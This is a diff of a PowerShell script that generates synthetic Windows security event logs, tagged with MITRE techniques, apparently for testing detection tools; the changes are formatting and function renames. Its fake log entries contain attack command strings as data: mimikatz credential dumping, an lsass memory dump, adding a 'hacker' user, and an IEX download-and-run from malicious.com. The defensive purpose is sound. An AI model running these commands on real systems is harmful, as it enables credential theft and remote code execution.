@@ -63,23 +63,23 @@
 
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory = $false)]
     [ValidateSet("CredentialDumping", "LateralMovement", "PrivilegeEscalation", "Persistence", "Reconnaissance", "DefenseEvasion", "All")]
     [string]$Scenario = "All",
 
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory = $false)]
     [int]$EventCount = 100,
 
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory = $false)]
     [string]$OutputPath = ".\SyntheticLogs",
 
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory = $false)]
     [int]$TimeSpan = 60,
 
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory = $false)]
     [switch]$IncludeNormalActivity,
 
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory = $false)]
     [ValidateSet("JSON", "CSV", "Both")]
     [string]$ExportFormat = "JSON"
 )
@@ -119,14 +119,14 @@ function New-SyntheticEvent {
     $timestamp = $startTime.AddMinutes((Get-Random -Minimum 0 -Maximum $TimeSpan))
 
     return [PSCustomObject]@{
-        TimeCreated = $timestamp.ToString("yyyy-MM-dd HH:mm:ss")
-        EventID = $EventID
-        EventType = $EventType
-        ComputerName = "DESKTOP-" + -join ((65..90) | Get-Random -Count 6 | ForEach-Object {[char]$_})
-        Suspicious = $Suspicious
+        TimeCreated    = $timestamp.ToString("yyyy-MM-dd HH:mm:ss")
+        EventID        = $EventID
+        EventType      = $EventType
+        ComputerName   = "DESKTOP-" + -join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
+        Suspicious     = $Suspicious
         MitreTechnique = $MitreTechnique
-        Description = $Description
-        EventData = $EventData
+        Description    = $Description
+        EventData      = $EventData
     }
 }
 
@@ -144,23 +144,24 @@ function Get-RandomProcess {
 
     if ($Suspicious) {
         $processes = @(
-            @{Name="powershell.exe"; Args="-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="},
-            @{Name="cmd.exe"; Args="/c whoami && net user"},
-            @{Name="mimikatz.exe"; Args="sekurlsa::logonpasswords"},
-            @{Name="procdump.exe"; Args="-ma lsass.exe lsass.dmp"},
-            @{Name="net.exe"; Args="user hacker P@ssw0rd /add"},
-            @{Name="rundll32.exe"; Args="C:\temp\evil.dll,EntryPoint"},
-            @{Name="wmic.exe"; Args="process call create cmd.exe"}
+            @{Name = "powershell.exe"; Args = "-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=" },
+            @{Name = "cmd.exe"; Args = "/c whoami && net user" },
+            @{Name = "mimikatz.exe"; Args = "sekurlsa::logonpasswords" },
+            @{Name = "procdump.exe"; Args = "-ma lsass.exe lsass.dmp" },
+            @{Name = "net.exe"; Args = "user hacker P@ssw0rd /add" },
+            @{Name = "rundll32.exe"; Args = "C:\temp\evil.dll,EntryPoint" },
+            @{Name = "wmic.exe"; Args = "process call create cmd.exe" }
         )
-    } else {
+    }
+    else {
         $processes = @(
-            @{Name="explorer.exe"; Args=""},
-            @{Name="chrome.exe"; Args="--type=renderer"},
-            @{Name="outlook.exe"; Args=""},
-            @{Name="teams.exe"; Args=""},
-            @{Name="notepad.exe"; Args="document.txt"},
-            @{Name="calc.exe"; Args=""},
-            @{Name="powershell.exe"; Args="Get-Date"}
+            @{Name = "explorer.exe"; Args = "" },
+            @{Name = "chrome.exe"; Args = "--type=renderer" },
+            @{Name = "outlook.exe"; Args = "" },
+            @{Name = "teams.exe"; Args = "" },
+            @{Name = "notepad.exe"; Args = "document.txt" },
+            @{Name = "calc.exe"; Args = "" },
+            @{Name = "powershell.exe"; Args = "Get-Date" }
         )
     }
 
@@ -171,7 +172,7 @@ function Get-RandomProcess {
 
 #region Event Generators
 
-function Generate-ProcessCreationEvents {
+function New-ProcessCreationEvents {
     param([int]$Count, [bool]$Suspicious = $false)
 
     Write-Host "[*] Generating Process Creation Events (4688)..." -ForegroundColor Cyan
@@ -181,11 +182,11 @@ function Generate-ProcessCreationEvents {
         $user = Get-RandomUser
 
         $eventData = @{
-            SubjectUserName = $user
+            SubjectUserName   = $user
             SubjectDomainName = "CORP"
-            NewProcessName = "C:\Windows\System32\$($process.Name)"
-            CommandLine = $process.Args
-            ProcessId = Get-Random -Minimum 1000 -Maximum 9999
+            NewProcessName    = "C:\Windows\System32\$($process.Name)"
+            CommandLine       = $process.Args
+            ProcessId         = Get-Random -Minimum 1000 -Maximum 9999
             ParentProcessName = "C:\Windows\System32\explorer.exe"
         }
 
@@ -198,16 +199,17 @@ function Generate-ProcessCreationEvents {
                 "wmic.exe" { "T1047" }
                 default { "T1059" }
             }
-        } else { "" }
+        }
+        else { "" }
 
-        $event = New-SyntheticEvent -EventID 4688 -EventType "Process Creation" -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID 4688 -EventType "Process Creation" -EventData $eventData `
             -MitreTechnique $mitre -Description "A new process has been created" -Suspicious $Suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-LogonEvents {
+function New-LogonEvents {
     param([int]$Count, [bool]$IncludeFailures = $true)
 
     Write-Host "[*] Generating Logon Events (4624, 4625)..." -ForegroundColor Cyan
@@ -218,12 +220,12 @@ function Generate-LogonEvents {
         $logonType = Get-Random -Minimum 2 -Maximum 11
 
         $eventData = @{
-            TargetUserName = Get-RandomUser
-            TargetDomainName = "CORP"
-            LogonType = $logonType
-            IpAddress = Get-RandomIP
-            WorkstationName = "WORKSTATION-" + (Get-Random -Minimum 1 -Maximum 999)
-            LogonProcessName = "User32"
+            TargetUserName            = Get-RandomUser
+            TargetDomainName          = "CORP"
+            LogonType                 = $logonType
+            IpAddress                 = Get-RandomIP
+            WorkstationName           = "WORKSTATION-" + (Get-Random -Minimum 1 -Maximum 999)
+            LogonProcessName          = "User32"
             AuthenticationPackageName = if ($logonType -eq 3) { "NTLM" } else { "Kerberos" }
         }
 
@@ -231,42 +233,42 @@ function Generate-LogonEvents {
         $mitre = if ($suspicious) { "T1110" } elseif ($logonType -eq 10) { "T1021.001" } else { "T1078" }
 
         $desc = if ($isFailure) { "An account failed to log on" } else { "An account was successfully logged on" }
-        $event = New-SyntheticEvent -EventID $eventID -EventType "Logon" -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID $eventID -EventType "Logon" -EventData $eventData `
             -MitreTechnique $mitre -Description $desc -Suspicious $suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-AccountManagementEvents {
+function New-AccountManagementEvents {
     param([int]$Count)
 
     Write-Host "[*] Generating Account Management Events (4720, 4722, 4726)..." -ForegroundColor Cyan
 
     $eventTypes = @(
-        @{ID=4720; Type="User Created"; Mitre="T1136.001"; Suspicious=$true},
-        @{ID=4722; Type="User Enabled"; Mitre="T1098"; Suspicious=$false},
-        @{ID=4726; Type="User Deleted"; Mitre="T1531"; Suspicious=$false}
+        @{ID = 4720; Type = "User Created"; Mitre = "T1136.001"; Suspicious = $true },
+        @{ID = 4722; Type = "User Enabled"; Mitre = "T1098"; Suspicious = $false },
+        @{ID = 4726; Type = "User Deleted"; Mitre = "T1531"; Suspicious = $false }
     )
 
     for ($i = 0; $i -lt $Count; $i++) {
         $eventType = $eventTypes | Get-Random
 
         $eventData = @{
-            TargetUserName = "user_" + (Get-Random -Minimum 1000 -Maximum 9999)
-            TargetDomainName = "CORP"
-            SubjectUserName = Get-RandomUser
+            TargetUserName    = "user_" + (Get-Random -Minimum 1000 -Maximum 9999)
+            TargetDomainName  = "CORP"
+            SubjectUserName   = Get-RandomUser
             SubjectDomainName = "CORP"
         }
 
-        $event = New-SyntheticEvent -EventID $eventType.ID -EventType $eventType.Type -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID $eventType.ID -EventType $eventType.Type -EventData $eventData `
             -MitreTechnique $eventType.Mitre -Description $eventType.Type -Suspicious $eventType.Suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-ScheduledTaskEvents {
+function New-ScheduledTaskEvents {
     param([int]$Count)
 
     Write-Host "[*] Generating Scheduled Task Events (4698, 4702)..." -ForegroundColor Cyan
@@ -277,60 +279,62 @@ function Generate-ScheduledTaskEvents {
 
         $taskName = if ($suspicious) {
             "Windows" + (Get-Random -Minimum 1 -Maximum 999)  # Masquerading
-        } else {
+        }
+        else {
             "Backup_Task_" + (Get-Random -Minimum 1 -Maximum 999)
         }
 
         $eventData = @{
-            TaskName = "\Microsoft\Windows\$taskName"
-            SubjectUserName = Get-RandomUser
+            TaskName          = "\Microsoft\Windows\$taskName"
+            SubjectUserName   = Get-RandomUser
             SubjectDomainName = "CORP"
-            TaskContent = if ($suspicious) {
+            TaskContent       = if ($suspicious) {
                 "<Command>powershell.exe</Command><Arguments>-enc JABzAD0ATgBlAHcALQBPAGIA</Arguments>"
-            } else {
+            }
+            else {
                 "<Command>backup.exe</Command><Arguments>/full</Arguments>"
             }
         }
 
         $desc = if ($eventID -eq 4698) { "A scheduled task was created" } else { "A scheduled task was updated" }
-        $event = New-SyntheticEvent -EventID $eventID -EventType "Scheduled Task" -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID $eventID -EventType "Scheduled Task" -EventData $eventData `
             -MitreTechnique "T1053.005" -Description $desc -Suspicious $suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-KerberosEvents {
+function New-KerberosEvents {
     param([int]$Count)
 
     Write-Host "[*] Generating Kerberos Events (4768, 4769, 4771)..." -ForegroundColor Cyan
 
     for ($i = 0; $i -lt $Count; $i++) {
         $eventTypes = @(
-            @{ID=4768; Type="TGT Request"; Mitre="T1558.001"},
-            @{ID=4769; Type="Service Ticket"; Mitre="T1558.003"},
-            @{ID=4771; Type="Pre-auth Failed"; Mitre="T1558.004"}
+            @{ID = 4768; Type = "TGT Request"; Mitre = "T1558.001" },
+            @{ID = 4769; Type = "Service Ticket"; Mitre = "T1558.003" },
+            @{ID = 4771; Type = "Pre-auth Failed"; Mitre = "T1558.004" }
         )
 
         $eventType = $eventTypes | Get-Random
         $suspicious = ($eventType.ID -eq 4769 -and (Get-Random -Minimum 0 -Maximum 100) -lt 20) -or
-                     ($eventType.ID -eq 4771)
+        ($eventType.ID -eq 4771)
 
         $eventData = @{
-            TargetUserName = Get-RandomUser
-            ServiceName = if ($eventType.ID -eq 4769) { "krbtgt/CORP.LOCAL" } else { "" }
-            IpAddress = Get-RandomIP
+            TargetUserName       = Get-RandomUser
+            ServiceName          = if ($eventType.ID -eq 4769) { "krbtgt/CORP.LOCAL" } else { "" }
+            IpAddress            = Get-RandomIP
             TicketEncryptionType = if ($suspicious) { "0x17" } else { "0x12" }  # RC4 vs AES
         }
 
-        $event = New-SyntheticEvent -EventID $eventType.ID -EventType $eventType.Type -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID $eventType.ID -EventType $eventType.Type -EventData $eventData `
             -MitreTechnique $eventType.Mitre -Description $eventType.Type -Suspicious $suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-NetworkConnectionEvents {
+function New-NetworkConnectionEvents {
     param([int]$Count)
 
     Write-Host "[*] Generating Network Connection Events (5156)..." -ForegroundColor Cyan
@@ -339,34 +343,37 @@ function Generate-NetworkConnectionEvents {
         $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 25
 
         $eventData = @{
-            Application = if ($suspicious) {
+            Application   = if ($suspicious) {
                 "C:\Windows\System32\powershell.exe"
-            } else {
+            }
+            else {
                 "C:\Program Files\Google\Chrome\chrome.exe"
             }
             SourceAddress = Get-RandomIP
-            SourcePort = Get-Random -Minimum 49152 -Maximum 65535
-            DestAddress = if ($suspicious) {
+            SourcePort    = Get-Random -Minimum 49152 -Maximum 65535
+            DestAddress   = if ($suspicious) {
                 "185.220.101." + (Get-Random -Minimum 1 -Maximum 254)  # Suspicious IP range
-            } else {
+            }
+            else {
                 "142.250.80." + (Get-Random -Minimum 1 -Maximum 254)  # Google IPs
             }
-            DestPort = if ($suspicious) {
+            DestPort      = if ($suspicious) {
                 Get-Random -Minimum 4444 -Maximum 4446  # Common C2 ports
-            } else {
+            }
+            else {
                 443
             }
-            Protocol = 6  # TCP
+            Protocol      = 6  # TCP
         }
 
-        $event = New-SyntheticEvent -EventID 5156 -EventType "Network Connection" -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID 5156 -EventType "Network Connection" -EventData $eventData `
             -MitreTechnique "T1071" -Description "The Windows Filtering Platform has permitted a connection" -Suspicious $suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-FileAccessEvents {
+function New-FileAccessEvents {
     param([int]$Count)
 
     Write-Host "[*] Generating File Access Events (4663)..." -ForegroundColor Cyan
@@ -375,26 +382,27 @@ function Generate-FileAccessEvents {
         $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 30
 
         $eventData = @{
-            SubjectUserName = Get-RandomUser
+            SubjectUserName   = Get-RandomUser
             SubjectDomainName = "CORP"
-            ObjectName = if ($suspicious) {
+            ObjectName        = if ($suspicious) {
                 "C:\Windows\System32\config\SAM"
-            } else {
+            }
+            else {
                 "C:\Users\$((Get-RandomUser))\Documents\file.docx"
             }
-            ProcessName = "C:\Windows\System32\notepad.exe"
-            AccessMask = "0x1"
+            ProcessName       = "C:\Windows\System32\notepad.exe"
+            AccessMask        = "0x1"
         }
 
         $mitre = if ($suspicious) { "T1003.002" } else { "T1005" }
-        $event = New-SyntheticEvent -EventID 4663 -EventType "File Access" -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID 4663 -EventType "File Access" -EventData $eventData `
             -MitreTechnique $mitre -Description "An attempt was made to access an object" -Suspicious $suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-RegistryEvents {
+function New-RegistryEvents {
     param([int]$Count)
 
     Write-Host "[*] Generating Registry Events (4657)..." -ForegroundColor Cyan
@@ -403,26 +411,27 @@ function Generate-RegistryEvents {
         $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 35
 
         $eventData = @{
-            SubjectUserName = Get-RandomUser
+            SubjectUserName   = Get-RandomUser
             SubjectDomainName = "CORP"
-            ObjectName = if ($suspicious) {
+            ObjectName        = if ($suspicious) {
                 "\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor"
-            } else {
+            }
+            else {
                 "\REGISTRY\USER\S-1-5-21-123456789-1234567890-123456789-1001\Software\Microsoft\Windows\CurrentVersion\Explorer"
             }
-            ProcessName = "C:\Windows\System32\reg.exe"
-            OperationType = "%%1904"  # Value set
+            ProcessName       = "C:\Windows\System32\reg.exe"
+            OperationType     = "%%1904"  # Value set
         }
 
         $mitre = if ($suspicious) { "T1547.001" } else { "T1112" }
-        $event = New-SyntheticEvent -EventID 4657 -EventType "Registry Modification" -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID 4657 -EventType "Registry Modification" -EventData $eventData `
             -MitreTechnique $mitre -Description "A registry value was modified" -Suspicious $suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
-function Generate-PowerShellEvents {
+function New-PowerShellEvents {
     param([int]$Count)
 
     Write-Host "[*] Generating PowerShell Events (4103, 4104)..." -ForegroundColor Cyan
@@ -432,21 +441,22 @@ function Generate-PowerShellEvents {
         $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 40
 
         $eventData = @{
-            ContextInfo = "Severity = Informational, Host = ConsoleHost"
-            UserData = Get-RandomUser
+            ContextInfo     = "Severity = Informational, Host = ConsoleHost"
+            UserData        = Get-RandomUser
             ScriptBlockText = if ($suspicious) {
                 "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
-            } else {
+            }
+            else {
                 "Get-ChildItem C:\Users\Documents"
             }
         }
 
         $mitre = if ($suspicious) { "T1059.001" } else { "" }
         $desc = if ($eventID -eq 4104) { "PowerShell script block logging" } else { "Module logging" }
-        $event = New-SyntheticEvent -EventID $eventID -EventType "PowerShell" -EventData $eventData `
+        $logEvent = New-SyntheticEvent -EventID $eventID -EventType "PowerShell" -EventData $eventData `
             -MitreTechnique $mitre -Description $desc -Suspicious $suspicious
 
-        $script:GeneratedEvents += $event
+        $script:GeneratedEvents += $logEvent
     }
 }
 
@@ -456,7 +466,8 @@ function Generate-PowerShellEvents {
 
 $scenariosToRun = if ($Scenario -eq "All") {
     @("CredentialDumping", "LateralMovement", "PrivilegeEscalation", "Persistence", "Reconnaissance", "DefenseEvasion")
-} else {
+}
+else {
     @($Scenario)
 }
 
@@ -465,31 +476,31 @@ foreach ($sc in $scenariosToRun) {
 
     switch ($sc) {
         "CredentialDumping" {
-            Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.15)) -Suspicious $true
-            Generate-FileAccessEvents -Count ([math]::Floor($EventCount * 0.10))
-            Generate-KerberosEvents -Count ([math]::Floor($EventCount * 0.10))
+            New-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.15)) -Suspicious $true
+            New-FileAccessEvents -Count ([math]::Floor($EventCount * 0.10))
+            New-KerberosEvents -Count ([math]::Floor($EventCount * 0.10))
         }
         "LateralMovement" {
-            Generate-LogonEvents -Count ([math]::Floor($EventCount * 0.20))
-            Generate-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.15))
-            Generate-FileAccessEvents -Count ([math]::Floor($EventCount * 0.10))
+            New-LogonEvents -Count ([math]::Floor($EventCount * 0.20))
+            New-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.15))
+            New-FileAccessEvents -Count ([math]::Floor($EventCount * 0.10))
         }
         "PrivilegeEscalation" {
-            Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.15)) -Suspicious $true
-            Generate-AccountManagementEvents -Count ([math]::Floor($EventCount * 0.10))
+            New-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.15)) -Suspicious $true
+            New-AccountManagementEvents -Count ([math]::Floor($EventCount * 0.10))
         }
         "Persistence" {
-            Generate-ScheduledTaskEvents -Count ([math]::Floor($EventCount * 0.15))
-            Generate-AccountManagementEvents -Count ([math]::Floor($EventCount * 0.10))
-            Generate-RegistryEvents -Count ([math]::Floor($EventCount * 0.10))
+            New-ScheduledTaskEvents -Count ([math]::Floor($EventCount * 0.15))
+            New-AccountManagementEvents -Count ([math]::Floor($EventCount * 0.10))
+            New-RegistryEvents -Count ([math]::Floor($EventCount * 0.10))
         }
         "Reconnaissance" {
-            Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.20)) -Suspicious $false
-            Generate-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.10))
+            New-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.20)) -Suspicious $false
+            New-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.10))
         }
         "DefenseEvasion" {
-            Generate-RegistryEvents -Count ([math]::Floor($EventCount * 0.15))
-            Generate-PowerShellEvents -Count ([math]::Floor($EventCount * 0.15))
+            New-RegistryEvents -Count ([math]::Floor($EventCount * 0.15))
+            New-PowerShellEvents -Count ([math]::Floor($EventCount * 0.15))
         }
     }
 }
@@ -497,9 +508,9 @@ foreach ($sc in $scenariosToRun) {
 # Add normal activity if requested
 if ($IncludeNormalActivity) {
     Write-Host "`nGenerating normal activity events..." -ForegroundColor Yellow
-    Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.30)) -Suspicious $false
-    Generate-LogonEvents -Count ([math]::Floor($EventCount * 0.20)) -IncludeFailures $false
-    Generate-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.20))
+    New-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.30)) -Suspicious $false
+    New-LogonEvents -Count ([math]::Floor($EventCount * 0.20)) -IncludeFailures $false
+    New-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.20))
 }
 
 #endregion
